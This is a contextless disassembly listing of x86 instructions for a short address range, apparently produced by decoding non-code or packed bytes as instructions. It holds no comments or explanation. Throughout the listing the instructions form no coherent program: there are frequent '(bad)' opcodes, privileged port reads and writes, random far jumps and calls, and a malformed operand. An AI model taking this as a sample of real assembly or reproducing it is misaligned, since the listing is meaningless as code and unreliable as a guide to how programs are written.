  4127c8:	pop    ecx
  4127c9:	sub    DWORD PTR [edx+0x480a8ebf],ebx
  4127cf:	out    0xbc,eax
  4127d1:	cmc    
  4127d2:	push   ds
  4127d3:	test   BYTE PTR [eax],0xfc
  4127d6:	repz mov edx,0x1d3a4718
  4127dc:	in     eax,dx
  4127dd:	dec    esp
  4127de:	push   ds
  4127df:	inc    ecx
  4127e0:	pop    esp
  4127e1:	out    dx,eax
  4127e2:	test   al,0xea
  4127e4:	push   edx
  4127e5:	jmp    0x8f22:0xe5e00358
  4127ec:	ret    
  4127ed:	mov    ebp,0x7439d8d6
  4127f2:	jb     0x412851
  4127f4:	ficomp DWORD PTR [ebx-0x6]
  4127f7:	inc    edx
  4127f8:	in     al,dx
  4127f9:	fistp  QWORD PTR [ecx]
  4127fb:	xchg   ecx,eax
  4127fc:	sub    eax,DWORD PTR ds:0xe8fd441d
  412802:	gs inc edx
  412804:	cwde   
  412805:	(bad)  
  412806:	and    eax,0x94c6b1a9
  41280b:	push   eax
  41280c:	out    dx,eax
  41280d:	loopne 0x41288b
  41280f:	or     cl,bl
  412811:	fidiv  DWORD PTR [edx-0x3b]
  412814:	fmul   st,st(0)
  412816:	js     0x4127d8
  412818:	mov    al,0xc1
  41281a:	retf   
  41281b:	out    dx,al
  41281c:	pusha  
  41281d:	push   ebx
  41281e:	mov    esp,DWORD PTR [eax-0x20]
  412821:	push   0xffffff91
  412823:	fld    TBYTE PTR [esi-0x2c]
  412826:	add    ecx,DWORD PTR [ebx+0x5047ba1]
  41282c:	mov    bl,0x60
  41282e:	shr    BYTE PTR [edi],0xc6
  412831:	js     0x4128a5
  412833:	xchg   esi,eax
  412834:	shl    BYTE PTR [edi],0x54
  412837:	sbb    BYTE PTR [ebp+0x71],ah
  41283a:	mov    ch,0xee
  41283c:	push   0xffffffaa
  41283e:	sbb    al,0x7e
  412840:	inc    edi
  412841:	inc    eax
  412842:	leave  
  412843:	sub    DWORD PTR [ebp+0x20],esp
  412846:	pop    esp
  412847:	lds    ecx,FWORD PTR [esi+edi*2-0x6e0df10]
  41284e:	sar    DWORD PTR [eax-0x2f],0xc5
  412852:	jmp    0xdd241f66
  412857:	jp     0x4128c0
  412859:	and    eax,0x42605a7d
  41285e:	pop    eax
  41285f:	ins    BYTE PTR es:[edi],dx
  412860:	aas    
  412861:	(bad)  
  412862:	mov    ds:0x38a775d6,eax
  412867:	imul   eax,DWORD PTR [edi+0x2c],0x6ee93235
  41286e:	pop    edx
  41286f:	out    0x25,eax
  412871:	jmp    0xf08dea78
  412876:	adc    ch,BYTE PTR [edx]
  412878:	lods   eax,DWORD PTR ds:[esi]
  412879:	sbb    BYTE PTR [ebp+0x69e2c7b1],ah
  41287f:	loope  0x4128ed
  412881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412882:	ins    BYTE PTR es:[edi],dx
  412883:	mov    fs,WORD PTR [eax]
  412885:	push   ebp
  412886:	gs mov bh,0x83
  412889:	mov    esi,0xb6cc13f4
  41288e:	arpl   bx,cx
  412890:	in     eax,dx
  412891:	xchg   BYTE PTR [esi+0x66],dl
  412894:	pop    ss
  412895:	push   ebp
  412896:	and    dl,BYTE PTR [ecx-0x6a]
  412899:	stos   BYTE PTR es:[edi],al
  41289a:	pop    esi
  41289b:	addr16 cmp eax,0xfa727858
  4128a1:	mov    eax,0x5553a1a
  4128a6:	inc    ebx
  4128a7:	mov    ecx,0x4b7b2117
  4128ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128ad:	or     DWORD PTR [edi],ebx
  4128af:	jae    0x4128c2
  4128b1:	ja     0x4128fb
  4128b3:	leave  
  4128b4:	adc    bl,BYTE PTR [edx]
  4128b6:	mov    BYTE PTR [edi+0x5c1ec4ea],dh
  4128bc:	test   BYTE PTR [edi+0x43],0x40
  4128c0:	jb     0x41287e
  4128c2:	mov    ah,0x16
  4128c4:	int    0xbd
  4128c6:	(bad)  
  4128c7:	mov    eax,ds:0xe0aaf481
  4128cc:	repz xor BYTE PTR [ebp-0x72],bl
  4128d0:	dec    esi
  4128d1:	out    dx,eax
  4128d2:	or     al,0x1
  4128d4:	sub    BYTE PTR ds:0x2efc80e8,bl
  4128da:	(bad)  
  4128db:	mov    ebp,0xc70621ea
  4128e0:	pop    edi
  4128e1:	pusha  
  4128e2:	ror    BYTE PTR [esi],1
  4128e4:	pop    eax
  4128e5:	jno    0x412888
  4128e7:	ret    
  4128e8:	rcl    edx,1
  4128ea:	push   ss
  4128eb:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4128ed:	and    BYTE PTR [eax+0x8],bh
  4128f0:	test   DWORD PTR [bp+si+0x69],edx
  4128f4:	(bad)  
  4128f6:	mov    dh,0x6
  4128f8:	je     0x41289f
  4128fa:	inc    esp
  4128fb:	lock icebp 
  4128fd:	add    DWORD PTR [ebp-0x4a],edi
  412900:	cld    
  412901:	adc    DWORD PTR [esi-0x54e2dc42],ebp
  412907:	sub    BYTE PTR [eax],bl
  412909:	pop    ss
  41290a:	fldcw  WORD PTR [ebp+0x7c41f37b]
  412910:	mov    ebx,0xd1c83d64
  412915:	and    ecx,DWORD PTR [edx]
  412917:	mov    DWORD PTR [eax-0x6a],edx
  41291a:	ror    BYTE PTR [ebp+0x3a1b65dc],1
  412920:	idiv   BYTE PTR [ecx]
  412922:	pop    edx
  412923:	mov    ebp,edx
  412925:	sub    al,0x5f
  412927:	or     ebp,ebx
  412929:	jmp    0x65a4df0e
  41292e:	in     al,dx
  41292f:	inc    edx
  412930:	or     edx,DWORD PTR [edi+0x128a2f97]
  412936:	mov    al,0xb5
  412938:	push   eax
  412939:	jg     0x4128cb
  41293b:	ror    BYTE PTR [ecx],0xea
  41293e:	les    edx,FWORD PTR [edi]
  412940:	and    BYTE PTR [eax-0x4a3f47a2],0xe2
  412947:	cmp    BYTE PTR [eax],0x39
  41294a:	loop   0x412953
  41294c:	jl     0x4129c1
  41294e:	push   edx
  41294f:	mov    ecx,0x82fb69e0
  412954:	rcl    esp,0x2b
  412957:	xchg   DWORD PTR [ebx+0x3f],eax
  41295a:	mov    dl,0xb2
  41295c:	pop    esi
  41295d:	addr16 imul ebp,edi,0x30129af0
  412964:	xor    BYTE PTR [edx-0x45c41ad0],dl
  41296a:	push   edi
  41296b:	add    al,0x3d
  41296d:	add    edx,DWORD PTR ds:0x16c545c3
  412973:	mov    cl,0xe7
  412975:	sbb    BYTE PTR [eax+esi*8],bh
  412978:	pop    esp
  412979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41297a:	jle    0x412972
  41297c:	jae    0x412964
  41297e:	setg   BYTE PTR ss:[esi+0x7311d525]
  412986:	pop    esi
  412987:	pop    edi
  412988:	ins    DWORD PTR es:[edi],dx
  412989:	call   esi
  41298b:	mov    ebx,0x89f18abf
  412990:	mov    edx,ecx
  412992:	int    0xec
  412994:	mov    eax,ds:0xb2b89925
  412999:	sbb    DWORD PTR [ebx+0xecfb108],esi
  41299f:	shl    DWORD PTR [edi],1
  4129a1:	int3   
  4129a2:	cs stos BYTE PTR es:[edi],al
  4129a4:	dec    ecx
  4129a5:	xchg   edi,eax
  4129a6:	ffreep st(2)
  4129a8:	sub    bl,BYTE PTR [ebp+ebp*8+0x51c56f77]
  4129af:	pusha  
  4129b0:	mov    ch,BYTE PTR ds:0x7470675c
  4129b6:	addr16 loop 0x4129d0
  4129b9:	push   esp
  4129ba:	call   FWORD PTR [eax]
  4129bc:	sub    esi,ecx
  4129be:	fistp  QWORD PTR [ebp+0x4b]
  4129c1:	cmp    al,bh
  4129c3:	stos   BYTE PTR es:[edi],al
  4129c4:	loope  0x4129ec
  4129c6:	and    BYTE PTR [edx+0x7c],ah
  4129c9:	fidivr DWORD PTR [ecx+0x9]
  4129cc:	cdq    
  4129cd:	adc    al,0xdf
  4129cf:	fldcw  WORD PTR [esi-0x706d4c9c]
  4129d5:	pop    ecx
  4129d6:	pmullw mm5,QWORD PTR [esi+eiz*1+0x76715373]
  4129de:	fmul   QWORD PTR [esi]
  4129e0:	rcl    cl,cl
  4129e2:	push   ds
  4129e3:	push   0x77
  4129e5:	test   ebp,eax
  4129e7:	mov    BYTE PTR [esi-0x45963c11],bh
  4129ed:	stc    
  4129ee:	sbb    al,0x44
  4129f0:	dec    eax
  4129f1:	les    edi,FWORD PTR [esp+esi*1]
  4129f4:	push   ebp
  4129f5:	push   cs
  4129f6:	xchg   edi,eax
  4129f7:	stc    
  4129f8:	icebp  
  4129f9:	pop    ebp
  4129fa:	hlt    
  4129fb:	xchg   edx,eax
  4129fc:	loop   0x412a46
  4129fe:	dec    ebx
  4129ff:	xchg   ebp,ebx
  412a01:	push   ebx
  412a02:	push   0x4dc862e8
  412a07:	popf   
  412a08:	xor    esi,0x7f
  412a0b:	sub    BYTE PTR [edx+edx*2+0x6b],ch
  412a0f:	pop    ebx
  412a10:	mov    edx,0x9388315c
  412a15:	inc    ecx
  412a16:	and    BYTE PTR [edx+0x54503867],ch
  412a1c:	sub    al,0x93
  412a1e:	and    ebp,DWORD PTR cs:[edx+0x2410a323]
  412a25:	fs inc esp
  412a27:	mov    eax,0x41b51c4e
  412a2c:	pop    ebx
  412a2d:	adc    DWORD PTR [ebp-0x4],0x6177e404
  412a34:	pmulhuw mm3,QWORD PTR [eax]
  412a37:	mov    ch,0x9a
  412a39:	sbb    eax,0xaf2a7f31
  412a3e:	fnstcw WORD PTR [ecx+0x58f579bf]
  412a44:	ins    BYTE PTR es:[edi],dx
  412a45:	xor    BYTE PTR [eax],ah
  412a47:	cmp    ebp,DWORD PTR [edx]
  412a49:	jns    0x412ac3
  412a4b:	je     0x412a07
  412a4d:	stos   BYTE PTR es:[edi],al
  412a4e:	inc    esp
  412a4f:	cwde   
  412a50:	jecxz  0x412acb
  412a52:	loope  0x412a68
  412a54:	aad    0x1f
  412a56:	adc    al,0x9a
  412a58:	ret    0xc876
  412a5b:	jns    0x4129f4
  412a5d:	sbb    edi,DWORD PTR [edi-0xfa2a7db]
  412a63:	pop    esp
  412a64:	mov    esi,0xb67d4f6c
  412a69:	scas   al,BYTE PTR es:[edi]
  412a6a:	aaa    
  412a6b:	cdq    
  412a6c:	mov    ah,0x39
  412a6e:	xor    ah,bl
  412a70:	push   es
  412a71:	add    ch,BYTE PTR [edi-0x5070cfa8]
  412a77:	push   ds
  412a78:	jle    0x412a93
  412a7a:	push   esi
  412a7b:	xor    ch,al
  412a7d:	xchg   DWORD PTR cs:[esi+0x65403acb],esp
  412a84:	or     eax,0xc96afcf6
  412a89:	aam    0xcb
  412a8b:	popa   
  412a8c:	mov    dh,BYTE PTR [ecx-0x641c77db]
  412a92:	cli    
  412a93:	std    
  412a94:	sub    al,0x59
  412a96:	test   ah,bh
  412a98:	mov    eax,ds:0xb1725784
  412a9d:	dec    ecx
  412a9e:	imul   esi,ecx,0xffffffd4
  412aa1:	jp     0x412a97
  412aa3:	mov    ah,0x48
  412aa5:	repnz pop ebp
  412aa7:	scas   ax,WORD PTR es:[edi]
  412aa9:	addr16 and eax,edi
  412aac:	push   eax
  412aae:	arpl   WORD PTR [esi-0x549a649f],si
  412ab4:	into   
  412ab5:	fidivr DWORD PTR [eax-0x625f5441]
  412abb:	inc    edi
  412abc:	in     al,0x70
  412abe:	call   0xccfa:0x45f6d21a
  412ac5:	pop    ss
  412ac6:	dec    edx
  412ac7:	jno    0x412ab6
  412ac9:	dec    ebp
  412aca:	push   es
  412acb:	imul   ebp,DWORD PTR [ebp+0x7dc132ef],0x5353906f
  412ad5:	push   ds
  412ad6:	ja     0x412b1c
  412ad8:	xor    al,0xb6
  412ada:	stos   BYTE PTR es:[edi],al
  412adb:	adc    ebx,DWORD PTR ds:0x2deec34
  412ae1:	sbb    BYTE PTR ds:0xaf7f3809,0xf0
  412ae8:	jnp    0x412ab7
  412aea:	(bad)  [ebp+0x76]
  412aed:	cmp    eax,0x7da61ae7
  412af2:	xchg   BYTE PTR [ecx-0x369d2db6],dl
  412af8:	jne    0x412ac3
  412afa:	dec    ecx
  412afb:	add    al,0x33
  412afd:	popf   
  412afe:	mov    esp,0x49c72326
  412b03:	pop    edi
  412b04:	aad    0xd7
  412b06:	test   eax,0x2f271df4
  412b0b:	adc    dh,BYTE PTR [edi+0x2d]
  412b0e:	sbb    al,0xd6
  412b10:	ror    DWORD PTR [ecx-0x55],cl
  412b13:	sar    DWORD PTR [edi],cl
  412b15:	mov    DWORD PTR [ebx+0xa],edi
  412b18:	fdiv   st(4),st
  412b1a:	(bad)  
  412b1b:	stos   BYTE PTR es:[edi],al
  412b1c:	push   cs
  412b1d:	xchg   esp,eax
  412b1e:	ret    0x7a44
  412b21:	mov    ebx,0xd941d1f0
  412b26:	mov    ecx,0x976f9e8
  412b2b:	mov    al,0x1e
  412b2d:	std    
  412b2e:	and    esp,eax
  412b30:	loope  0x412b80
  412b32:	mov    ds:0xdba833a7,al
  412b37:	das    
  412b38:	pop    ebx
  412b39:	jecxz  0x412b32
  412b3b:	stc    
  412b3c:	loop   0x412ae4
  412b3e:	fnstcw WORD PTR [edx]
  412b40:	pop    esi
  412b41:	add    eax,0x34c0692e
  412b46:	sbb    BYTE PTR [ebp-0x4d4dc737],0x31
  412b4d:	add    al,0xd2
  412b4f:	and    eax,0xd6eaa989
  412b54:	fwait
  412b55:	pop    ss
  412b56:	ins    DWORD PTR es:[edi],dx
  412b57:	shr    BYTE PTR [ebx-0x3b4e858f],1
  412b5d:	loop   0x412b35
  412b5f:	daa    
  412b60:	and    DWORD PTR [ebp+esi*2-0x2032ab8b],edi
  412b67:	pop    es
  412b68:	jnp    0x412bbd
  412b6a:	sbb    BYTE PTR [eax-0x3a5453f4],ah
  412b70:	xchg   edx,eax
  412b71:	mov    eax,0x7f26b00
  412b76:	iret   
  412b77:	jmp    0x412bda
  412b79:	bound  eax,QWORD PTR [edx]
  412b7b:	cmp    eax,0xcc2bdf08
  412b80:	test   DWORD PTR ds:0x7db6a528,esp
  412b86:	cli    
  412b87:	ror    DWORD PTR [edi+0x40],1
  412b8a:	adc    DWORD PTR [ebx],edx
  412b8c:	das    
  412b8d:	sti    
  412b8e:	cmp    BYTE PTR [esi+esi*8+0x1c],cl
  412b92:	sub    BYTE PTR [ecx],cl
  412b94:	xor    ebx,DWORD PTR [ebx+0x49fd5bf7]
  412b9a:	daa    
  412b9b:	lea    eax,[ebp-0x5d9e017b]
  412ba1:	and    dh,ch
  412ba3:	cld    
  412ba4:	cli    
  412ba5:	sbb    BYTE PTR [edx+0x50636d7a],ah
  412bab:	push   edx
  412bac:	adc    eax,0x7e972146
  412bb1:	out    dx,eax
  412bb2:	inc    esi
  412bb3:	dec    edx
  412bb4:	sub    DWORD PTR [ebp-0x4e],eax
  412bb7:	pusha  
  412bb8:	rol    DWORD PTR [edi],cl
  412bba:	sub    BYTE PTR [ebx-0x4f],dl
  412bbd:	lock jo 0x412bac
  412bc0:	sub    ebx,ecx
  412bc2:	test   al,0x14
  412bc4:	jmp    0x412c3f
  412bc6:	push   esp
  412bc7:	jmp    0x412bea
  412bc9:	shr    BYTE PTR [ebx+0x327f90aa],cl
  412bcf:	push   eax
  412bd0:	xchg   edx,eax
  412bd1:	repnz xchg ecx,eax
  412bd3:	ja     0x412bb6
  412bd5:	lahf   
  412bd6:	push   edi
  412bd7:	push   edx
  412bd8:	dec    edx
  412bd9:	jle    0x412c46
  412bdb:	lea    ebx,[edi-0x20a5bc55]
  412be1:	and    esp,edx
  412be3:	test   al,0xfe
  412be5:	fstp   DWORD PTR [edx+0x50]
  412be8:	jo     0x412c17
  412bea:	pop    ds
  412beb:	jmp    0x52dc489c
  412bf0:	call   0x7b58839
  412bf5:	ja     0x412c4b
  412bf7:	xor    eax,0xe1bd3e8
  412bfc:	xchg   edi,eax
  412bfd:	xchg   edi,eax
  412bfe:	dec    eax
  412bff:	push   edx
  412c00:	push   es
  412c01:	lahf   
  412c02:	out    0x2f,al
  412c04:	mov    ?,WORD PTR [edx-0x3e]
  412c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c08:	mov    esi,edi
  412c0a:	adc    ebp,DWORD PTR [eax+0x59ba93f2]
  412c10:	aam    0xb1
  412c12:	cmp    DWORD PTR [esi+ecx*4+0x52],0x20
  412c17:	sbb    ebx,0x3a
  412c1a:	cwde   
  412c1b:	out    dx,al
  412c1c:	inc    ecx
  412c1d:	or     DWORD PTR [esi-0x2a],ebp
  412c20:	jb     0x412c4a
  412c22:	inc    esp
  412c23:	sbb    BYTE PTR [esi],bh
  412c25:	cli    
  412c26:	ins    BYTE PTR es:[edi],dx
  412c27:	(bad)  [edx+0x6289b231]
  412c2d:	jmp    0x19bc:0x7fb994a1
  412c34:	pushw  es
  412c36:	fild   QWORD PTR [edi-0x23]
  412c39:	stos   BYTE PTR es:[edi],al
  412c3a:	push   ecx
  412c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c3c:	mov    ds:0xbc9caf8d,al
  412c41:	adc    BYTE PTR [edi],dl
  412c43:	ror    cl,1
  412c45:	push   esp
  412c46:	xor    al,dh
  412c48:	out    0x26,al
  412c4a:	cmp    BYTE PTR ds:0x1a21fa2c,al
  412c50:	mov    esp,0xf6caad2e
  412c55:	push   0x4b917e0e
  412c5a:	into   
  412c5b:	or     bl,cl
  412c5d:	mov    ebx,0x19964d9d
  412c62:	ficomp WORD PTR [esi-0x67]
  412c65:	push   eax
  412c66:	xor    ebp,DWORD PTR [esi-0x1f]
  412c69:	cmp    al,0xe2
  412c6b:	aad    0x16
  412c6d:	sti    
  412c6e:	ret    
  412c6f:	push   0xfffffffd
  412c71:	cmp    BYTE PTR [ebx-0x5d],bl
  412c74:	xchg   ebp,eax
  412c75:	add    DWORD PTR [edi],edi
  412c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c79:	inc    eax
  412c7a:	jmp    0x412c6e
  412c7c:	mov    al,0x5b
  412c7e:	pop    eax
  412c7f:	add    ecx,edi
  412c81:	pusha  
  412c82:	or     edi,DWORD PTR [ebx+ebx*4-0x71201840]
  412c89:	jb     0x412c45
  412c8b:	push   cs
  412c8c:	aam    0x8c
  412c8e:	mov    dh,0xc4
  412c90:	cld    
  412c91:	es call 0x6141:0xda1bec8b
  412c99:	mov    ch,bl
  412c9b:	pop    esi
  412c9c:	in     eax,0x47
  412c9e:	(bad)  
  412ca0:	adc    edx,DWORD PTR [edi]
  412ca2:	sbb    BYTE PTR [edi],bh
  412ca4:	mov    bl,0xf2
  412ca6:	add    BYTE PTR [eax+0x3c],ch
  412ca9:	pop    es
  412caa:	mov    DWORD PTR [ecx+0x1072a9f3],esp
  412cb0:	rcl    DWORD PTR [edi+0x7e],cl
  412cb3:	(bad)  
  412cb4:	in     eax,dx
  412cb5:	cwde   
  412cb6:	dec    edi
  412cb7:	push   edx
  412cb8:	adc    al,0xfb
  412cba:	adc    ax,ax
  412cbd:	and    ebx,ebx
  412cbf:	add    ebp,DWORD PTR [esi+0x77f3d0ef]
  412cc5:	int    0xaf
  412cc7:	xchg   esi,eax
  412cc8:	pop    esi
  412cc9:	jmp    0xb8b1:0x321af1fc
  412cd0:	adc    DWORD PTR [ebx+0x40fa0b38],ebp
  412cd6:	adc    al,0xa9
  412cd8:	mov    ebx,0x7bcab42
  412cdd:	xchg   edx,eax
  412cde:	jmp    FWORD PTR [ecx-0x69]
  412ce1:	xor    DWORD PTR [eax],ebx
  412ce3:	sar    DWORD PTR [edx-0x36df3bb3],1
  412ce9:	jge    0x412d10
  412ceb:	pextrw esi,mm6,0xfe
  412cef:	rol    DWORD PTR [edx-0x6c],cl
  412cf2:	xor    DWORD PTR [eax-0x72e14611],esp
  412cf8:	push   0xb
  412cfa:	adc    edi,DWORD PTR [esi+0x48]
  412cfd:	pop    edx
  412cfe:	adc    bh,BYTE PTR [ecx+ebx*4-0x39c1ec80]
  412d05:	in     al,0x38
  412d07:	stos   BYTE PTR es:[edi],al
  412d08:	call   0xf984:0x15e68466
  412d0f:	xor    al,0xd4
  412d11:	mov    eax,0xeb1fa175
  412d16:	xchg   BYTE PTR [ebx+0x41],al
  412d19:	aad    0xd3
  412d1b:	add    dh,BYTE PTR [edi-0x2c5c6d0c]
  412d21:	pop    ds
  412d22:	sub    BYTE PTR [ecx-0x6fc2195f],cl
  412d28:	das    
  412d29:	jge    0x412cee
  412d2b:	cmp    esi,ebp
  412d2d:	sti    
  412d2e:	pop    esi
  412d2f:	sub    al,BYTE PTR [esi+0x79]
  412d32:	jmp    0x2d790ca0
  412d37:	jg     0x412d84
  412d39:	push   eax
  412d3a:	cmp    eax,0xbe3fcefe
  412d3f:	xchg   ebp,edx
  412d41:	sbb    DWORD PTR [esi-0x10],edx
  412d44:	xchg   edx,eax
  412d45:	test   ebx,edx
  412d47:	xchg   DWORD PTR gs:[eax+ecx*4+0x57fdedad],ebp
  412d4f:	ins    BYTE PTR es:[edi],dx
  412d50:	fild   DWORD PTR [esi]
  412d52:	and    BYTE PTR [ebx],bh
  412d54:	sahf   
  412d55:	inc    edx
  412d56:	scas   eax,DWORD PTR es:[edi]
  412d57:	icebp  
  412d58:	cmp    bl,ch
  412d5a:	add    DWORD PTR [ecx+0x26fe0b60],0xffffffd7
  412d61:	dec    edx
  412d62:	mov    ch,0xf3
  412d64:	sbb    ebp,DWORD PTR ds:0xa6cdf951
  412d6a:	jmp    0x3c0cc37c
  412d6f:	(bad)  
  412d70:	js     0x412da1
  412d72:	or     esp,ecx
  412d74:	rol    ecx,0xf1
  412d77:	aam    0x38
  412d79:	call   0x724d:0x3e109eac
  412d80:	xchg   edx,eax
  412d81:	mov    ecx,ecx
  412d83:	dec    esp
  412d84:	js     0x412d3c
  412d86:	fstp   TBYTE PTR [edx+0xd]
  412d89:	inc    ebx
  412d8a:	(bad)  
  412d8b:	hlt    
  412d8c:	sub    al,0xf0
  412d8e:	mov    eax,ds:0xbf100776
  412d93:	fwait
  412d94:	xor    dl,BYTE PTR [eax+0x4a]
  412d97:	mov    eax,0xa6471e35
  412d9c:	inc    esp
  412d9d:	lahf   
  412d9e:	test   eax,0x13a0586b
  412da3:	fwait
  412da4:	int3   
  412da5:	dec    edi
  412da6:	adc    esp,edx
  412da8:	xor    bh,BYTE PTR [edx]
  412daa:	mov    cl,0x48
  412dac:	jp     0x412e09
  412dae:	cmp    esp,esp
  412db0:	sbb    DWORD PTR [ecx],edx
  412db2:	sbb    al,0x86
  412db4:	xchg   edi,ebp
  412db6:	scas   eax,DWORD PTR es:[edi]
  412db7:	iret   
  412db8:	jecxz  0x412df4
  412dba:	xchg   ecx,eax
  412dbb:	or     dh,BYTE PTR [ecx+0x3f]
  412dbe:	enter  0xec35,0x62
  412dc2:	dec    ebx
  412dc3:	inc    eax
  412dc4:	pop    esi
  412dc5:	dec    eax
  412dc6:	(bad)  
  412dc7:	les    edx,FWORD PTR [ebx]
  412dc9:	sbb    bh,bl
  412dcb:	aas    
  412dcc:	cmp    al,0x41
  412dce:	and    bh,BYTE PTR [ebx-0x4b8e2655]
  412dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dd5:	jmp    0xff7ecec7
  412dda:	sahf   
  412ddb:	(bad)  
  412ddd:	mov    cl,0xb2
  412ddf:	fst    QWORD PTR [esi]
  412de1:	pop    edi
  412de2:	sbb    al,0x2b
  412de4:	mov    eax,0x9582ec95
  412de9:	mov    dh,bh
  412deb:	outs   dx,DWORD PTR ds:[esi]
  412dec:	sbb    eax,0x4fb8a8ec
  412df1:	mov    eax,ecx
  412df3:	in     eax,0x23
  412df5:	mov    bh,0xfa
  412df7:	cdq    
  412df8:	xchg   esi,eax
  412df9:	xchg   DWORD PTR [esi+0x3e83230],esp
  412dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e00:	push   eax
  412e01:	ret    0xcdbb
  412e04:	cs jge 0x412de9
  412e07:	xlat   BYTE PTR ds:[ebx]
  412e08:	lahf   
  412e09:	sbb    BYTE PTR ds:0x566e1b01,ch
  412e0f:	xor    DWORD PTR [ecx-0x34faf7ed],ebx
  412e15:	xor    DWORD PTR [ebx-0x1f1b4fcc],ecx
  412e1b:	adc    al,0xdc
  412e1d:	stos   DWORD PTR es:[edi],eax
  412e1e:	lds    esp,FWORD PTR [edx-0x305eb691]
  412e24:	loopne 0x412ddd
  412e26:	dec    ecx
  412e27:	ja     0x412e74
  412e29:	mov    ebx,DWORD PTR [ecx]
  412e2b:	loope  0x412df4
  412e2d:	(bad)  
  412e2e:	mov    esp,0x56c3c711
  412e33:	dec    ebp
  412e34:	add    BYTE PTR [ebp+0x67466001],cl
  412e3a:	lods   eax,DWORD PTR ds:[esi]
  412e3b:	push   edx
  412e3c:	xchg   edx,eax
  412e3d:	ja     0x412df3
  412e3f:	cdq    
  412e40:	jb     0x412de7
  412e42:	scas   eax,DWORD PTR es:[edi]
  412e43:	jb     0x412eb4
  412e45:	imul   esi,ebp,0x2
  412e48:	cmc    
  412e49:	xchg   edi,eax
  412e4a:	lahf   
  412e4b:	shr    DWORD PTR [eax],0xb2
  412e4e:	lods   eax,DWORD PTR ds:[esi]
  412e50:	in     eax,dx
  412e51:	popa   
  412e52:	lods   al,BYTE PTR ds:[esi]
  412e53:	(bad)  
  412e54:	rcr    DWORD PTR [edx+0x64],1
  412e57:	jecxz  0x412ece
  412e59:	mov    dh,0x7f
  412e5b:	ins    DWORD PTR es:[edi],dx
  412e5c:	sbb    DWORD PTR [eax],ebx
  412e5e:	pop    es
  412e5f:	sbb    BYTE PTR [ebp-0x76be072d],bl
  412e65:	cmp    al,0x92
  412e67:	adc    al,0x73
  412e69:	push   ecx
  412e6a:	data16 mov ah,0x8
  412e6d:	in     eax,dx
  412e6e:	pop    ds
  412e6f:	stos   DWORD PTR es:[edi],eax
  412e70:	add    al,0x29
  412e72:	lods   al,BYTE PTR ds:[esi]
  412e73:	jmp    0x26453595
  412e78:	push   eax
  412e79:	and    eax,0x3efc6b8
  412e7e:	(bad)  
  412e7f:	out    0x7b,al
  412e81:	adc    esi,0xa515ef54
  412e87:	xlat   BYTE PTR ds:[ebx]
  412e88:	sub    al,0x70
  412e8a:	lods   eax,DWORD PTR ds:[esi]
  412e8b:	push   0xffffffdc
  412e8d:	dec    ecx
  412e8e:	dec    eax
  412e8f:	hlt    
  412e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e91:	rol    BYTE PTR [ebx-0x56],0xf5
  412e95:	(bad)  
  412e96:	stc    
  412e97:	shl    DWORD PTR [ecx],1
  412e99:	stos   BYTE PTR es:[edi],al
  412e9a:	pop    ebx
  412e9b:	out    dx,eax
  412e9c:	std    
  412e9d:	cmp    edi,ecx
  412e9f:	lods   al,BYTE PTR ds:[esi]
  412ea0:	(bad)  
  412ea1:	fs push ecx
  412ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ea4:	hlt    
  412ea5:	fdivr  DWORD PTR [ebp-0x6eae815f]
  412eab:	in     al,0x84
  412ead:	pushf  
  412eae:	mov    bl,0x21
  412eb0:	mov    ecx,0x2f37841
  412eb5:	in     al,0xc4
  412eb7:	lods   eax,DWORD PTR ds:[esi]
  412eb8:	fsubr  st(0),st
  412eba:	lods   al,BYTE PTR ds:[esi]
  412ebb:	xchg   ebp,eax
  412ebc:	mov    ds:0x19929e9f,al
  412ec1:	push   0x1d
  412ec3:	pop    esp
  412ec4:	lock jns 0x412e61
  412ec7:	push   esp
  412ec8:	sahf   
  412ec9:	fld    TBYTE PTR [esi+ebx*1-0x2c]
  412ecd:	call   0x7d17de14
  412ed2:	push   ebp
  412ed3:	test   eax,0x97b204b8
  412ed8:	dec    BYTE PTR [esi]
  412eda:	pop    esp
  412edb:	ds pop ebp
  412edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ede:	push   ds
  412edf:	mov    dl,BYTE PTR [esi]
  412ee1:	xchg   DWORD PTR [edi-0x3c],esp
  412ee4:	and    DWORD PTR [eax+0x5365ab90],edx
  412eea:	jne    0x412f41
  412eec:	dec    esp
  412eed:	xlat   BYTE PTR ds:[ebx]
  412eee:	and    BYTE PTR [ecx-0x266b3927],0x34
  412ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef6:	sub    cl,BYTE PTR ds:[edx-0x71f3b0e0]
  412efd:	adc    BYTE PTR ds:0x8d3d521e,bl
  412f03:	test   BYTE PTR [esi],dh
  412f05:	aad    0x67
  412f07:	xor    esp,DWORD PTR [ebp+0x1394e1bb]
  412f0d:	ins    DWORD PTR es:[edi],dx
  412f0e:	mov    esi,0x967313c2
  412f13:	sub    ch,bl
  412f15:	ss dec edx
  412f17:	adc    al,0x6
  412f19:	jnp    0x412f58
  412f1b:	cmp    edx,0x776d7381
  412f21:	xchg   esi,eax
  412f22:	pop    edx
  412f23:	lahf   
  412f24:	xor    al,0x62
  412f26:	setge  BYTE PTR [ecx]
  412f29:	mov    ebx,DWORD PTR [edx+0x39]
  412f2c:	ds das 
  412f2e:	enter  0xe688,0x64
  412f32:	mov    eax,ds:0xec05740c
  412f37:	std    
  412f38:	mov    ebp,0xd3f3126f
  412f3d:	push   cs
  412f3e:	cmovne ebx,DWORD PTR [edx]
  412f41:	ret    0xdf47
  412f44:	or     al,0x99
  412f46:	bound  ebx,QWORD PTR [edi-0x6c]
  412f49:	cmp    dl,BYTE PTR [edx+edx*8]
  412f4c:	or     DWORD PTR [edi+edx*1-0x4b],esp
  412f50:	scas   eax,DWORD PTR es:[edi]
  412f51:	xlat   BYTE PTR ds:[ebx]
  412f52:	mov    esi,0xfa4bcbd3
